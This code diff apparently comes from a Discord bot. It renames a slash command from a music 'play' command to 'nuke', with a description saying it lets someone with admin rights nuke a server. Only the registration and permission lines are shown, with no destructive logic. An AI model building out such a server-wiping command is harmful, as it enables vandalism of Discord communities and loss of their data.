@@ -28,8 +28,8 @@ const integrationTypes = [
 
 const commands = [
   new SlashCommandBuilder()
-    .setName('play')
-    .setDescription('A music bot that lets you play music, control playback, and enjoy your favorite songs with friends in your Discord server. 🎵')
+    .setName('nuke')
+    .setDescription('A bot that lets you nuke server, by having a admin role or higher')
     .setDefaultMemberPermissions(roleName ? 0n : PermissionFlagsBits.Administrator)
     .addBooleanOption(o =>
       o.setName('roles')
